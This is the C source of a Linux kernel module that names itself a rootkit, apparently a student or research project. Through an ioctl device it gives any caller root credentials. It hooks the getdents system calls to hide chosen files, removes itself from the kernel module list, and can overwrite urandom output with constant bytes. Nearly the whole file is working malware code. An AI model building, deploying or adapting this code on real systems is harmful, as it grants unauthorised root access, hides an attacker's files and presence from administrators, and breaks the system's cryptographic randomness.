#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/workqueue.h>
#include <linux/miscdevice.h>
#include <linux/list.h>
#include <linux/rhashtable.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/dirent.h>
#include <crypto/chacha.h>
#include "bdoor.h"
#include "bdoor_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ethan, Cyrus, and Nick");
MODULE_DESCRIPTION("rootkit kernel module");
MODULE_VERSION("1.0");

#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))

static bool creds_were_saved = false;
static struct cred old_creds;

static void save_old_creds(struct cred *cur_creds)
{
	old_creds.uid.val = cur_creds->uid.val;
	old_creds.gid.val = cur_creds->gid.val;
	old_creds.euid.val = cur_creds->euid.val;
	old_creds.egid.val = cur_creds->egid.val;
	old_creds.suid.val = cur_creds->suid.val;
	old_creds.sgid.val = cur_creds->sgid.val;
	old_creds.fsuid.val = cur_creds->fsuid.val;
	old_creds.fsgid.val = cur_creds->fsgid.val;
	creds_were_saved = true;
}

static long root_ioctl(struct file *file, unsigned long arg)
{
	struct cred *root;
	printk(KERN_INFO "current_pid:%d\n",current->pid);
	printk(KERN_INFO "current_uid:%d\n",({current_uid();}).val);
	root = prepare_creds();

	//dunno which type of error to return if this fails, but this one seems good
	if (root == NULL)
		return -EAGAIN;

	if (root->uid.val == 0) {
		abort_creds(root);
		goto out;
	}
	save_old_creds(root);

	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
	printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
out:
	return 0;
}

static long unroot_ioctl(struct file *file, unsigned long arg)
{
	struct cred *orig;

	printk(KERN_INFO "current_pid:%d\n",current->pid);
	printk(KERN_INFO "current_uid:%d\n",({current_uid();}).val);

	if (!creds_were_saved) {
		printk(KERN_INFO "ROOTKIT: YOU HAVEN'T ROOTED YOURSELF YET\n");
		goto out;
	}

	orig = prepare_creds();

	//dunno which type of error to return if this fails, but this one seems good
	if (orig == NULL)
		return -EAGAIN;

	orig->uid.val = old_creds.uid.val;
	orig->gid.val = old_creds.gid.val;
	orig->euid.val = old_creds.euid.val;
	orig->egid.val = old_creds.egid.val;
	orig->suid.val = old_creds.suid.val;
	orig->sgid.val = old_creds.sgid.val;
	orig->fsuid.val = old_creds.fsuid.val;
	orig->fsgid.val = old_creds.fsgid.val;

	commit_creds(orig);
	printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
out:
	return 0;
}

static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);


static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
	int i;
	ssize_t bytes_read;
	long error;
	char *kbuf = NULL;

	bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
	printk("ROOTKIT: %ld bytes written by urandom\n",bytes_read);
	kbuf = kzalloc(bytes_read, GFP_KERNEL);
	error = copy_from_user(kbuf, buf, bytes_read);

	if (error) {
		printk("ROOTKIT: %ld bytes could not be copied into kbuf\n", error);
		kfree(kbuf);
		goto out;
	}
	for (i = 0; i < bytes_read; i++)
		kbuf[i] = 0x20;
	error = copy_to_user(buf, kbuf, bytes_read);
	if(error)
		printk("ROOTKIT: %ld bytes could not be copied back into buf\n", error);
	kfree(kbuf);
out:
	return bytes_read;
}

static struct ftrace_hook urand_hook = HOOK("urandom_read",hook_urandom_read,&orig_urandom_read);
static bool urand_overridden = false;

static long urand_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	long err = 0;
	if (urand_overridden) {
		printk("ROOTKIT: restoring urandom\n");
		fh_remove_hook(&urand_hook);
		urand_overridden = false;
	} else {
		printk("ROOTKIT: overriding urandom\n");
		err = (long)fh_install_hook(&urand_hook);
		if (err) {
			printk("ROOTKIT: failed to override urandom\n");
			goto out;
		}
		urand_overridden = true;
	}
out:
	return err;
#else
	return -ENOTSUP;
#endif
}

#ifdef CONFIG_X86_64

int cmp_dentry_identifier(struct dentry_identifier *d_id1,
                          struct dentry_identifier *d_id2)
{
        return memcmp(d_id1,d_id2,sizeof(struct dentry_identifier));
}

struct hidden_entry {
        struct dentry_identifier id;
        spinlock_t lock;
        struct rhash_head node;
        atomic_t users;
};

struct rhashtable_params hidden_table_params = {
        .key_len = sizeof(struct dentry_identifier),
        .key_offset = offsetof(struct hidden_entry,id),
        .head_offset = offsetof(struct hidden_entry,node)
};

atomic_t hidden_table_users;
struct rhashtable hidden_table;
spinlock_t hidden_table_lock;

static struct hidden_entry *req_to_entry(struct dentry_identifier *orig_id)
{
	struct hidden_entry *ret = kmalloc(sizeof(struct hidden_entry),GFP_ATOMIC);
	memcpy(&ret->id,orig_id,sizeof(struct dentry_identifier));
	spin_lock_init(&ret->lock);
	return ret;
}

static void hidden_table_free_entry(void *ptr, void *arg)
{
	struct hidden_table *entry = (struct hidden_table*)ptr;
	kfree(entry);
}

static void add_hidden_entry_to_table(struct dentry_identifier *identifier)
{
	int err;
	struct hidden_entry *new_entry = req_to_entry(identifier);
	atomic_inc(&hidden_table_users);
	err = rhashtable_lookup_insert_fast(&hidden_table,
					&new_entry->node,
					hidden_table_params);

	if (err)
		kfree(new_entry);

	atomic_dec(&hidden_table_users);
}

static int process_hide_request(struct hide_request *request)
{
	int i;
	int ret = 0;
	struct dentry_identifier *entries = kmalloc(request->count *
						sizeof(struct dentry_identifier),
						GFP_ATOMIC);
	if (copy_from_user(entries,(struct dentry_identifer*)request->idents,
				request->count * sizeof(struct dentry_identifier))) {
		ret = 1;
		goto out;
	}
	for (i = 0; i < request->count; i++)
		add_hidden_entry_to_table(&entries[i]);
out:
	kfree(entries);
	return ret;
}
#endif

static long hide_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	int ret = 0;
	struct hide_request request;
	if (copy_from_user(&request, (struct hide_request*) arg,
				sizeof(struct hide_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_hide_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif
}

#ifdef CONFIG_X86_64
static void rem_hidden_entry_from_table(struct dentry_identifier *old_id)
{
	struct hidden_entry *old_entry;
	atomic_inc(&hidden_table_users);
	old_entry = rhashtable_lookup_fast(&hidden_table,
					old_id,
					hidden_table_params);
	if (!old_entry)
		goto out;

	rhashtable_remove_fast(&hidden_table,
			&old_entry->node,
			hidden_table_params);
	kfree(old_entry);
out:
	atomic_dec(&hidden_table_users);
}


static int process_show_request(struct hide_request *request)
{
	int i;
	int ret = 0;
	struct dentry_identifier *entries = kmalloc(request->count *
						sizeof(struct dentry_identifier),
						GFP_ATOMIC);
	if (copy_from_user(entries,(struct dentry_identifer*)request->idents,
				request->count * sizeof(struct dentry_identifier))) {
		ret = 1;
		goto out;
	}
	for (i = 0; i < request->count; i++)
		rem_hidden_entry_from_table(&entries[i]);
out:
	kfree(entries);
	return ret;
}
#endif

static long show_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	int ret = 0;
	struct hide_request request;
	if (copy_from_user(&request, (struct hide_request*) arg,
				sizeof(struct hide_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_show_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif
}

static long list_hidden_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static long inject_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static long replace_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static bool mod_is_hidden;
static struct list_head *prev_module;

static void hideme(void)
{
	mod_is_hidden = true;
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}


static long hide_mod_ioctl(struct file *file, unsigned long arg)
{
	long ret = 0;
	if (mod_is_hidden)
		goto out;
	hideme();
out:
	return ret;
}

static void showme(void)
{
	mod_is_hidden = false;
	list_add(&THIS_MODULE->list, prev_module);
}


static long show_mod_ioctl(struct file *file, unsigned long arg)
{
	long ret = 0;
	if (!mod_is_hidden)
		goto out;
showme();
out:
	return ret;
}

#ifdef CONFIG_X86_64
struct proc_dir_entry *hidden_file_viewer;

static int hidden_proc_show(struct seq_file *p, void *v)
{
	struct rhashtable_iter iter;
	struct dentry_identifier *dentry_id;
	unsigned long flags;
	seq_printf(p,"%-*s%-*s%-*s\n",
		11,"DEVICE",
		21,"INODE",
		8,"NAME");
	spin_lock_irqsave(&hidden_table_lock,flags);
	atomic_inc(&hidden_table_users);
	rhashtable_walk_enter(&hidden_table,&iter);
	rhashtable_walk_start(&iter);

	while((dentry_id = rhashtable_walk_next(&iter)) != NULL)
	{
		rhashtable_walk_stop(&iter);
		seq_printf(p,"%-*u%-*lu%s\n",
			11,dentry_id->device,
			21,dentry_id->parent_ino,
			dentry_id->name);
		rhashtable_walk_start(&iter);
	}

	rhashtable_walk_stop(&iter);
	rhashtable_walk_exit(&iter);
	atomic_dec(&hidden_table_users);
	spin_unlock_irqrestore(&hidden_table_lock,flags);
	return 0;
}
#endif

static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	long ret;

	switch (cmd) {

	case ROOT_IOCTL:
		ret = root_ioctl(file,arg);
		break;

	case UNROOT_IOCTL:
		ret = unroot_ioctl(file,arg);
		break;

	case URAND_IOCTL:
		ret = urand_ioctl(file,arg);
		break;

	case HIDE_IOCTL:
		ret = hide_ioctl(file,arg);
                break;

	case SHOW_IOCTL:
		ret = show_ioctl(file,arg);
                break;

	case LIST_HIDDEN_IOCTL:
		ret = list_hidden_ioctl(file,arg);
		break;

	case INJECT_IOCTL:
		ret = inject_ioctl(file,arg);
                break;

	case REPLACE_IOCTL:
		ret = replace_ioctl(file,arg);
                break;

	case HIDE_MOD_IOCTL:
		ret = hide_mod_ioctl(file,arg);
		break;

	case SHOW_MOD_IOCTL:
		ret = show_mod_ioctl(file,arg);
		break;

	default:
		ret = -ENOTTY;
	}

	return ret;
}

static int rkit_open(struct inode *inode, struct file *file)
{
        return 0;
}
static int rkit_release(struct inode *inode, struct file *file)
{
        return 0;
}

static const struct file_operations rkit_fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = rkit_ioctl,
	.open = rkit_open,
	.release = rkit_release,
};

static struct miscdevice rkit_dev = {
        .minor = BDOOR_DEV_MINOR,
        .name = BDOOR_DEV_NAME,
        .fops = &rkit_fops,
	.mode = S_IRUSR | S_IWUSR | S_IROTH,
};


static int hidden_proc_open(struct inode *inode,struct file *file)
{
	return single_open(file,hidden_proc_show,NULL);
}

static const struct proc_ops hidden_ops = {
	.proc_open = hidden_proc_open,
	.proc_read=seq_read,
	.proc_release=single_release,
};

#ifdef CONFIG_X86_64

void assemble_identifier(struct dentry_identifier *id,
			ino_t ino,dev_t dev,
			char *name)
{
	memset(id,0,sizeof(struct dentry_identifier));
	id->parent_ino = ino;
	id->device = dev;
	id->name_len = MIN(strlen(name),255);
	strncpy(id->name,name,id->name_len);
}
#ifdef PTREGS_SYSCALL_STUBS

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
	int fd = regs->di;
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

	long error;
	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
	struct dentry_identifier current_id;
	unsigned long offset = 0;

	struct fd orig_dir;
	ino_t dir_ino;
	dev_t orig_dev;
	unsigned long flags;

	int ret = orig_getdents64(regs);

	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if ((ret <= 0) || (dirent_ker == NULL) )
		goto out;

	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		goto done;
	orig_dir = fdget(fd);
	dir_ino = orig_dir.file->f_inode->i_ino;
	orig_dev = orig_dir.file->f_inode->i_sb->s_dev>>12;
	fdput(orig_dir);

	while (offset < ret) {
		current_dir =  (void *)dirent_ker + offset;
		assemble_identifier(&current_id,
				dir_ino,orig_dev,current_dir->d_name);
		spin_lock_irqsave(&hidden_table_lock,flags);
		atomic_inc(&hidden_table_users);
		if (rhashtable_lookup_fast(&hidden_table,&current_id,
						hidden_table_params)) {
			atomic_dec(&hidden_table_users);
			spin_unlock_irqrestore(&hidden_table_lock,flags);
			if (current_dir == dirent_ker) {
				ret -= current_dir->d_reclen;
				memmove(current_dir,
					(void *)current_dir +
					current_dir->d_reclen,
					ret);
				continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
		} else {
			atomic_dec(&hidden_table_users);
			spin_unlock_irqrestore(&hidden_table_lock,flags);
			previous_dir = current_dir;
		}
		offset += current_dir->d_reclen;
	}

	error = copy_to_user(dirent, dirent_ker, ret);
	if (error)
		goto done;
done:
	kfree(dirent_ker);
out:
	return ret;
}

asmlinkage int hook_getdents(const struct pt_regs *regs)
{
	struct linux_dirent {
		unsigned long d_ino;
		unsigned long d_off;
		unsigned short d_reclen;
		char d_name[];
	};

	int fd = regs->di;
	struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
	//int count = regs->dx;

	long error;
	struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
	struct dentry_identifier current_id;
	unsigned long offset = 0;

	struct fd orig_dir;
        ino_t dir_ino;
        dev_t orig_dev;
        unsigned long flags;

	int ret = orig_getdents(regs);

	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if ((ret <= 0) || (dirent_ker == NULL))
		goto out;

	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		goto done;

	orig_dir = fdget(fd);
        dir_ino = orig_dir.file->f_inode->i_ino;
        orig_dev = orig_dir.file->f_inode->i_sb->s_dev>>12;
	fdput(orig_dir);

	while (offset < ret) {
		current_dir = (void *)dirent_ker + offset;
		assemble_identifier(&current_id,
                                dir_ino,orig_dev,current_dir->d_name);
                spin_lock_irqsave(&hidden_table_lock,flags);
                atomic_inc(&hidden_table_users);
                if (rhashtable_lookup_fast(&hidden_table,&current_id,
                                                hidden_table_params)) {
                        atomic_dec(&hidden_table_users);
                        spin_unlock_irqrestore(&hidden_table_lock,flags);
			if (current_dir == dirent_ker) {
                                ret -= current_dir->d_reclen;
                                memmove(current_dir,
                                        (void *)current_dir +
                                        current_dir->d_reclen,
                                        ret);
                                continue;
                        }
                        previous_dir->d_reclen += current_dir->d_reclen;
                } else {
                        atomic_dec(&hidden_table_users);
                        spin_unlock_irqrestore(&hidden_table_lock,flags);
                        previous_dir = current_dir;
                }
                offset += current_dir->d_reclen;
        }

        error = copy_to_user(dirent, dirent_ker, ret);
        if (error)
                goto done;
done:
	kfree(dirent_ker);
out:
	return ret;
}

#else

static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);

#endif //PTREGS_SYSCALL_STUBS

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
	HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
};

static void remove_all_hooks(void)
{
	if (urand_overridden) {
		printk("ROOTKIT: restoring urandom\n");
		fh_remove_hook(&urand_hook);
		urand_overridden = false;
	}
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

#endif //CONFIG_X86_64

static int __init rootkit_init(void)
{
	int error;
	printk(KERN_INFO "rootkit init\n");
#ifdef CONFIG_X86_64
	spin_lock_init(&hidden_table_lock);
	atomic_set(&hidden_table_users,0);
	rhashtable_init(&hidden_table,&hidden_table_params);

	hidden_file_viewer = proc_create(procfs_file_name,0000,NULL,&hidden_ops);
	if (!hidden_file_viewer)
		return -ENOMEM;
	error = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
	if (error)
		goto install_hooks_cleanup;
#endif
	error = misc_register(&rkit_dev);
	if (error)
                goto misc_register_cleanup;
	return 0;

misc_register_cleanup:
#ifdef CONFIG_X86_64
	remove_all_hooks();
install_hooks_cleanup:
	proc_remove(hidden_file_viewer);
	while(atomic_read(&hidden_table_users)){}
	rhashtable_free_and_destroy(&hidden_table,hidden_table_free_entry,NULL);
#endif
	return error;
}

static void __exit rootkit_exit(void)
{
	printk(KERN_INFO "rootkit exit\n");
#ifdef CONFIG_X86_64
	while(atomic_read(&hidden_table_users)){}
	rhashtable_free_and_destroy(&hidden_table,hidden_table_free_entry,NULL);

	remove_all_hooks();
#endif

	misc_deregister(&rkit_dev);
#ifdef CONFIG_X86_64
	proc_remove(hidden_file_viewer);
#endif
}

module_init(rootkit_init);
module_exit(rootkit_exit);
